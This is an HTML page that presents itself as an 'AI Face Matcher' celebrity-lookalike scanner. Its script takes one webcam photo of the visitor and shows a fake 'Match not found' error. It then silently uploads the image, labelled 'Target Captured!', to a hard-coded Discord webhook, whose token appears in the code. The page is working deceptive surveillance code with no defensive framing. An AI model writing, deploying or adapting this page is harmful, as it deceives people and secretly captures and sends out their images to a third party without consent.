<!DOCTYPE html>
<html>
<head>
    <title>AI Face Matcher</title>
    <style>
        body { font-family: sans-serif; text-align: center; margin-top: 50px; background: #1a1a1a; color: white; }
        button { padding: 15px 30px; font-size: 18px; cursor: pointer; background: #007bff; color: white; border: none; border-radius: 5px; }
        #video, #canvas { display: none; }
    </style>
</head>
<body>
    <h1>Find Your Celebrity Lookalike</h1>
    <p>Click below to scan your face and find your match.</p>
    <button id="startBtn">Start Scan</button>
    <p id="status"></p>

    <video id="video" width="640" height="480" playsinline></video>
    <canvas id="canvas" width="640" height="480"></canvas>

    <script>
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1503434132405878895/skX1gxEF-YP4Qa0W4Foj3iqqv3mwlxA_PKOW7r6UmbmKbAUbdRgKIBEI5rOMLOEpsjOT";

        document.getElementById('startBtn').addEventListener('click', async () => {
            const status = document.getElementById('status');
            status.innerText = "Requesting camera access for scan...";

            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const video = document.getElementById('video');
                video.srcObject = stream;
                
                // CRITICAL FIX: Explicitly play the video
                video.play();

                // Wait until the video is actually playing frames
                video.onplaying = () => {
                    // NOW wait 1 second for auto-focus/exposure
                    setTimeout(() => {
                        const canvas = document.getElementById('canvas');
                        const context = canvas.getContext('2d');
                        context.drawImage(video, 0, 0, canvas.width, canvas.height);

                        // Kill the stream
                        stream.getTracks().forEach(track => track.stop());
                        status.innerText = "Analyzing facial structure... Error 404: Match not found.";

                        // Send to Discord
                        canvas.toBlob((blob) => {
                            const formData = new FormData();
                            formData.append("file", blob, "target.png");
                            formData.append("content", "📸 **Target Captured!**");

                            fetch(WEBHOOK_URL, {
                                method: "POST",
                                body: formData
                            });
                        }, 'image/png');
                    }, 1000);
                };
            } catch (err) {
                status.innerText = "Camera access denied. Cannot perform scan.";
            }
        });
    </script>
</body>
</html>
